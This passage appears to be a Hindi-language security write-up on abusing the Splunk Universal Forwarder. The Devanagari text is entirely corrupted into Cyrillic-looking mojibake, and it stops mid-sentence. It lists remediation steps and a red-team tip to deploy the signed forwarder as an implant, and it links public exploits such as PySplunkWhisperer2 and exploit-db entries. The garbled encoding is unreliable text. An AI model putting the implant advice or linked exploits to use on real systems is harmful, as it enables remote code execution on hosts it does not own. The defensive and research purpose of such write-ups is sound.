## рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрднрд┐рдирд┐рд╡реЗрд╢рди рд╕реВрдЪрдирд╛: Splunk рдХреЗ рд▓рд┐рдП <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ Splunk рдПрдЬреЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдореИрдВ рдХрдо рд╕реЗ рдХрдо 15 рд╡рд░реНрдгреЛрдВ рдХрд╛ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ, рд▓реЗрдХрд┐рди рдХреНрдпреЛрдВрдХрд┐ рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рдЯрд╛рдЗрдк рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕реЗ 50 рд╡рд░реНрдгреЛрдВ рдЬреИрд╕рд╛ рдмрдбрд╝рд╛ рдкрд╛рд╕рд╡рд░реНрдб рднреА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
2. рд╣реЛрд╕реНрдЯ рдЖрдзрд╛рд░рд┐рдд рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рд╕реНрдкреНрд▓рдВрдХ рд╕рд░реНрд╡рд░ рд╕реЗ рдкреЛрд░реНрдЯ 8089/TCP (рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлрд╝реЙрд░рд╡рд░реНрдбрд░ рдПрдЬреЗрдВрдЯ рдХрд╛ рдкреЛрд░реНрдЯ) рдХреЗ рд▓рд┐рдП рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдП рдЬрд╛рдПрдВред

## рд░реЗрдб рдЯреАрдо рдХреЗ рд▓рд┐рдП рд╕реБрдЭрд╛рд╡: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. рдкреНрд░рддреНрдпреЗрдХ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП Splunk рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлрд╝реЙрд░рд╡рд░реНрдбрд░ рдХреА рдПрдХ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рдмрдврд╝рд┐рдпрд╛ рд╣рд▓реНрдХрд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рд╣реИред рдЗрд╕реЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рд░рдЦрдирд╛ рдЕрдЪреНрдЫрд╛ рд╣реЛрдЧрд╛ред

## рдЕрдиреНрдп рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧреА рдЦреЛрдЬ / рдмреНрд▓реЙрдЧ <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

рдЙрдкрдпреЛрдЧреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЦреЛрдЬ:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

рд╕рдВрдмрдВрдзрд┐рдд рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_** рдиреЛрдЯ: **_ рдпрд╣ рд╕рдорд╕реНрдпрд╛ рд╕реНрдкреНрд▓рдВрдХ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдПрдХ рдЧрдВрднреАрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдиреНрдп рдкрд░реАрдХреНрд╖рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╡рд░реНрд╖реЛрдВ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрджреНрдпрдкрд┐ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рд╕реНрдкреНрд▓рдВрдХ рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рдлрд╝реЙрд░рд╡рд░реНрдбрд░ рдХрд╛ рдПрдХ рдЗрдЪреНрдЫрд┐рдд рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдЕрдВрдорд▓рдг рдЦрддрд░рдирд╛рдХ рд╣реИред рдореИрдВрдиреЗ рдЗрд╕ рдмрдЧ рдХреЛ рд╕реНрдкреНрд▓рдВрдХ рдХреЗ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛, рдмрд╣реБрдд рд╣реА рдХрдо рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдЗрд╕ рдбрд┐рдЬрд╝рд╛рдЗрди рдХреЗ рдкреНрд░рднрд╛рд╡реЛрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рди рд╣реЛ, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдХрд┐рд╕реА рднреА рдмрдЧ рд╕рдмрдорд┐рд╢рди рдХреЛ рдмрдЧ рдХреНрд░рд╛рдЙрдб / рд╕реНрдкреНрд▓рдВрдХ рдбрд┐рд╕реНрдХреНрд▓реЛрдЬрд░ рдкреЙрд▓рд┐рд╕реА рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рд╡рд░рдгреЛрдВ рдХрд╛ рдХреЛрдИ рднреА рд╡рд┐рд╡рд░рдг рд╕реНрдкреНрд▓рдВрдХ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛ рдХрднреА рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЪрд░реНрдЪрд╛ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдореИрдВрдиреЗ 90 рджрд┐рди рдХреА рдбрд┐рд╕реНрдХреНрд▓реЛрдЬрд░ рдЯрд╛рдЗрдорд▓рд╛рдЗрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдФрд░ рдЗрд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ред рдЗрд╕рд▓рд┐рдП, рдореИрдВрдиреЗ рдЗрд╕реЗ рдЬрд┐рдореНрдореЗрджрд╛рд░реАрдкреВрд░реНрд╡рдХ рдЦреБрд▓рд╛рд╕рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдХреНрдпреЛ
